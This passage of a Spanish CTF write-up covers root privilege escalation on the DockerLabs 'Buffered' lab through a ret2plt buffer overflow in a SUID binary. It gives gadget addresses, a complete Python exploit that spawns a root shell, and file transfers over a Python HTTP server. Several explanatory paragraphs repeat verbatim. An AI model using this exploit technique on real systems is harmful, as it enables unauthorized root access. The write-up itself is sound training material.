⠄⠄⠄⠄⡀⣀⡀⠈⢷⡄⡄⣠⢸⣿⠄⠄⢿⣌⠐⠄⠰⢈⣼⠇⠄⠄⣿⣌⣀⣤⡜⠋⢀⣀⣀⡀⠄⠄⠄⠄
⠄⠄⠠⠬⠛⠘⠻⣦⠄⠈⠁⣡⢸⣿⠄⠈⣄⣀⢀⡀⣀⢀⢀⠆⠄⠄⣿⣌⠉⠁⠄⣔⡟⠛⠛⠯⠄⠄⠄⠄
⠄⠄⡈⠲⠁⠄⠄⢺⣣⢰⡼⠏⢸⣿⠄⠄⠈⠟⢸⡇⡿⠘⠈⠄⠄⠄⣿⢓⡟⣶⣶⡛⠂⠄⠸⠖⠪⠄⠄⠄
⠄⠄⢇⠉⠄⠄⠄⠄⠈⢈⣁⣀⢸⣿⣶⣶⣶⣶⣶⣶⢶⡶⣶⣶⣶⡶⣿⡀⣀⡉⠈⠄⠄⠄⠄⠋⠄⠄⠄⠄
⠄⠄⠈⣐⡻⠹⠷⠄⠰⡟⠘⠋⠄⠄⣀⡠⠠⢤⠄⠤⠄⣤⠤⠄⣀⠄⠄⠁⠙⢛⡷⠄⠴⠟⢾⣂⠄⠄⠄⠄
⠄⠄⠄⣭⡇⠄⠅⢀⢛⠂⠄⣠⣤⢶⡿⠂⢨⣳⠄⣻⡃⢚⣧⠄⠚⣵⣠⣄⡀⠄⣻⡃⡻⡀⠄⣭⡇⠄⠄⠄
⠄⠄⠄⠹⣾⣄⣤⡼⡓⢀⣾⠏⠉⠄⣀⣠⡺⡍⠄⣽⡅⠸⡿⣦⢀⠄⠈⠩⣷⡄⠸⡫⣠⡤⣶⠊⠄⠄⠄⠄
⠄⠄⠄⠄⠈⢠⡍⠉⠄⠐⣭⡤⣴⢿⡭⣯⣥⣤⣤⢯⢤⣤⡤⣭⡬⣽⢷⣤⡭⠱⠄⠄⢩⠁⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠁⠄⠄⣜⣾⠭⠍⠬⠡⠍⠬⠅⠭⠨⠨⠨⠅⠍⠥⠩⠌⠥⢻⡽⡀⠄⠈⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⡜⣾⠣⠍⠭⠡⠭⠨⠭⠥⠭⠬⠬⠬⡁⠥⠩⠍⠭⠩⠝⣿⡱⡀⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠨⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠵⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
Mon Jan 19 14:24:40 CST 2026
# whoami
root?
# id
uid=0(root?) gid=0(root?) groups=0(root?)
# ls -la
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
```

Podemos ver que la propiedad de este binario es el usuario root.

```d
tyler@e28272dae0de:/home/tyler$ ./shell 
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
Segmentation fault
```

Parece que tenemos otro BoF, así que vamos a transferir este binario con nosotros usando un servidor python y descargarlo con wget.

```r
tyler@e28272dae0de:/home/tyler$ python3 -m http.server 100 
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Vamos a transferir este binario.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ wget http://172.17.0.2:100/shell 
--2026-01-19 15:29:34--  http://172.17.0.2:100/shell
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16488 (16K) [application/octet-stream]
Saving to: ‘shell’

shell                                                       100%[==================================================>]  16.10K  --.-KB/s    in 0s      

2026-01-19 15:29:34 (351 MB/s) - ‘shell’ saved [16488/16488]
```

Cuando intentamos ejecutarlo muestra un error:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./shell 
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
Segmentation fault
```

Parece que ha cambiado el suid del usuario. Así que necesitamos ejecutar los siguientes comandos:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ sudo chown root:root shell
```

Cambiamos la propiedad del binario a root.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ sudo chmod +sxr shell
```

Añadimos algunos permisos al binario: S (SUID), X (Execute), R (Read).

Y después de hacer eso, podemos ejecutar el binario como en la máquina objetivo.

```d
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./shell 
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
# whoami
root?
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer),1000(craft)
```

¡Ahora estamos como root en nuestro sistema!

Ahora vamos a ver un poco de información de este binario con **file**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ file shell
shell: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=137bd5981401f47039690cfee3ac82eb128a9eba, for GNU/Linux 3.2.0, not stripped
```

Podemos ver que es un ejecutable de 64 bits, sin strip.

En mi caso voy a usar GDB para ver más información de este binario.

En mi caso estoy usando un alias (**sgdb**) que hace esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ which sgdb
sgdb: aliased to sudo -E gdb
```

Con esto podemos ejecutar GDB con el plugin de GEF porque si no lo hacemos, el plugin no se cargará. Como el usuario root preservará el entorno del usuario que se está ejecutando actualmente con sudo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ sgdb -q shell 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
Reading symbols from shell...
(No debugging symbols found in shell)
gef➤
```

Podemos intentar ver qué protecciones tiene este binario.

```r
gef➤  checksec
[+] checksec for '/home/craft/challenges/dockerlabs/dificil/buffered/files/shell'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

En este caso no podemos usar shellcodes para ejecutar comandos arbitrarios en el sistema porque NX (No Ejecutable) está habilitado.

Voy a hacer uso de **Ghidra** para hacer un poco de reverse engineering y ver qué hace este ejecutable más profundamente.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ghidra
```

En este binario hay 3 funciones principales; `main`, `pwnme`, `_date`

Básicamente la función **main** comprueba si el setuid (Set User Id) y el setgid (Set Group Id) son iguales a 0 (root), si no lo son, muestra un error, de lo contrario, si el Setuid y el Setgid son iguales a 0, la función main va a llamar a la función **pwnme**.

Pwnme pregunta al usuario la entrada, si es igual a **whoami** o **id** van a mostrar una salida como los comandos normales en linux, pero no, o incluso si la entrada del usuario es igual a **date**, la función va a llamar a la función `_date`, o si no mostrará un mensaje "Eres root...".

`_date` llama a la función system y ejecuta el comando **date**, y se mostrará la fecha del sistema, desafortunadamente el script da toda la ruta del comando date evitando un Path hijacking.

Así que, ¿qué hacer ahora?

Nada está terminado, existen 2 funciones que son muy interesantes ocultas en el binario: `_x1`, `_x2`

Para crear un payload, necesitamos usar ret2plt.

¿Qué es Ret2plt?

Ret2plt es una técnica que es un tipo de ataque En buffer overflows, permitiendo al atacante ejecutar código arbitrario redirigiendo el flujo del programa a otra función más en específico: **Procedure Linkage Table**.

Plt es básicamente una forma de llamar a funciones de C por ejemplo en este binario tenemos **system@plt** que puede llamar a la función original de system sin conocer la dirección real de la función system.

¿Por qué hacemos esto?

Porque en la máquina objetivo tienen ASLR (Address Space Layout Randomization) activado, esta parte del sistema puede tener 3 estados:

- 0 (Sin aleatoriedad, direcciones de memoria estáticas)
- 1 (Aleatoriedad parcial, esto puede hacer que la dirección por ejemplo de la pila y otros registros sea aleatoria)
- 2 (Aleatoriedad total, toda la memoria es aleatoria y no podemos predecirla)

En este sistema, ASLR se establece en 2.

```r
tyler@e28272dae0de:/home/tyler$ cat /proc/sys/kernel/randomize_va_space 
2
```

Así que con esta técnica podemos **saltar** esta restricción y aprovechando que PIE (Position Independent Executable) está deshabilitado, esto significa que las direcciones internas del binario serán estáticas.

Bien, entonces necesitamos hacer un payload que siga el siguiente orden:

- **RDI, RSI, RDX, R10** ....

No te preocupes, solo vamos a usar **RDI: Índice de destino para operaciones de cadena.**

El payload se verá algo así:

System call            RDI
System               "/bin/sh"

Y se verá algo así: **system("/bin/sh")**

Bien, ¿cómo podemos poner /bin/sh en el registro **RDI**?

En este binario será un poco más complicado, porque no tenemos una **instrucción** que podamos poner directamente esta cadena en ella.

Necesitamos analizar las funciones `_x1`, `_x2` y leer lo que hace este binario más profundamente.

```r
gef➤  disas _x1
Dump of assembler code for function _x1:
   0x0000000000401499 <+0>:     push   rbp
   0x000000000040149a <+1>:     mov    rbp,rsp
   0x000000000040149d <+4>:     pop    r13
   0x000000000040149f <+6>:     ret
   0x00000000004014a0 <+7>:     nop
   0x00000000004014a1 <+8>:     pop    rbp
   0x00000000004014a2 <+9>:     ret
```

Esta es la función `_x1` y todo su código de ensamblaje.

La parte interesante es que podemos usar el **pop r13** para la siguiente función `_x2`

```r
gef➤  disas _x2
Dump of assembler code for function _x2:
   0x00000000004014a3 <+0>:     push   rbp
   0x00000000004014a4 <+1>:     mov    rbp,rsp
   0x00000000004014a7 <+4>:     mov    rdi,rsp
   0x00000000004014aa <+7>:     jmp    r13
   0x00000000004014ad <+10>:    nop
   0x00000000004014ae <+11>:    pop    rbp
   0x00000000004014af <+12>:    ret
```

Bien, este es donde está la parte divertida, para las siguientes instrucciones:

- **mov    rdi,rsp**
- **jmp     r13**

Con la 1ª instrucción, estamos tomando todos los datos de **RSP (Stack Pointer / Stack)** y guardándolos en **RDI**.

Así que podemos poner la cadena **/bin/sh** en la pila y se guardará en **RDI** cuando estemos haciendo el BoF

Y con la 2ª instrucción, el programa obviamente saltará a **r13**.

Esto significa que podemos usar **pop r13** para agregar la función de **system@plt** a este registro.

Y se verá algo así la instrucción que ejecutará el programa: **system("/bin/sh")**

- Llamada al sistema -> R13
- /bin/sh -> RDI

Y luego llamamos a la función `_x2` para hacer que el flujo del programa salte a system y ejecute una shell como el usuario root.

Bien, entonces ¿qué más podemos hacer?

Nada está terminado, existen 2 funciones que son muy interesantes ocultas en el binario: `_x1`, `_x2`

Para crear un payload, necesitamos usar ret2plt.

¿Qué es Ret2plt?

Ret2plt es una técnica que es un tipo de ataque En buffer overflows, permitiendo al atacante ejecutar código arbitrario redirigiendo el flujo del programa a otra función más en específico: **Procedure Linkage Table**.

Plt es básicamente una forma de llamar a funciones de C por ejemplo en este binario tenemos **system@plt** que puede llamar a la función original de system sin conocer la dirección real de la función system.

¿Por qué hacemos esto?

Porque en la máquina objetivo tienen ASLR (Address Space Layout Randomization) activado, esta parte del sistema puede tener 3 estados:

- 0 (Sin aleatoriedad, direcciones de memoria estáticas)
- 1 (Aleatoriedad parcial, esto puede hacer que la dirección por ejemplo de la pila y otros registros sea aleatoria)
- 2 (Aleatoriedad total, toda la memoria es aleatoria y no podemos predecirla)

En este sistema, ASLR se establece en 2.

```r
tyler@803d95498647:/home/tyler$ cat /proc/sys/kernel/randomize_va_space 
2
```

Así que con esta técnica podemos **saltar** esta restricción y aprovechando que PIE (Position Independent Executable) está deshabilitado, esto significa que las direcciones internas del binario serán estáticas.

Bien, entonces necesitamos hacer un payload que siga el siguiente orden:

- **RDI, RSI, RDX, R10** ....

No te preocupes, solo vamos a usar **RDI: Índice de destino para operaciones de cadena.**

El payload se verá algo así:

System call            RDI
System               "/bin/sh"

Y se verá algo así: **system("/bin/sh")**

Bien, ¿cómo podemos poner /bin/sh en el registro **RDI**?

En este binario será un poco más complicado, porque no tenemos una **instrucción** que podamos poner directamente esta cadena en ella.

Necesitamos analizar las funciones `_x1`, `_x2` y leer lo que hace este binario más profundamente.

En mi caso voy a hacer un diagrama con **excalidraw** una vez más para explicar el Ataque de este BoF.

![Screenshot](/hard/Buffered/Images/image22es.png)

Y finalmente voy a hacer el exploit de este BoF.

```python
import pexpect

def p64(addr):
    return addr.to_bytes(8, "little")

def exploit():
    prc = pexpect.spawn("./shell")

    # 0x40149d: pop r13; ret;
    # $1 = {<text variable, no debug info>} 0x401040 <system@plt>
    # 0x4014a3  _x2

    pop_r13 = p64(0x40149d)
    sys_addr = p64(0x401040)
    _x2 = p64(0x4014a3)

    sh_str = b"/bin/sh\x00"

    offset = 136 - len(sh_str)

    junk = b"A"*offset

    payload = junk + sh_str + pop_r13 + sys_addr + _x2

    prc.expect("#")
    prc.sendline(payload)
    prc.interact()

if __name__ == "__main__":
    exploit()
```

En la biblioteca **pexpect** no tiene la función p64, esta función convertimos cualquier dirección en bytes con 8 bytes, porque el programa tiene una arquitectura de 64 bits -> 8 bytes, 32 bits -> 4 bytes, y en formato little endian.

Un sistema little-endian almacena el byte **menos significativo (LSB)** en la dirección de memoria más baja. La "parte inferior" (la parte menos significativa de los datos) viene primero. Para el mismo entero de 32 bits `0x12345678`, un sistema little-endian lo almacenaría como:

```r
Address:   00   01   02   03 
Data:      78   56   34   12
```

Aquí, `0x78` es el byte menos significativo, ubicado en la dirección más baja (**00**), seguido por `0x56`, `0x34` y `0x12` en la dirección más alta (**03**).

Después de toda esta explicación, veamos si el exploit funciona en nuestra máquina local (máquina atacante).

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 bof_ret2plt.py 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh^@�^T@^@^@^@^@^@@^P@^@^@^@^@^@�^T@^@^@^@^@^@
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer),1000(craft)
```

¡Estamos como root en nuestro sistema!

Ahora vamos a transferir este archivo a la máquina objetivo haciendo un servidor python y descargándolo con **curl**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Bien, hagamos la transferencia.

```r
tyler@803d95498647:/home/tyler$ curl http://172.17.0.1/bof_ret2plt.py -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   575  100   575    0     0   4236      0 --:--:-- --:--:-- --:--:--  4259
```

Ejecutemos ahora el exploit.

```lua
tyler@803d95498647:/home/tyler$ python3 bof_ret2plt.py 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh^@�^T@^@^@^@^@^@@^P@^@^@^@^@^@�^T@^@^@^@^@^@
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
# bash
root@803d95498647:/home/tyler# whoami
root
root@803d95498647:/home/tyler# id
uid=0(root) gid=0(root) groups=0(root),1002(tyler)
```

¡Ahora estamos como **root**! ***...pwned..!***
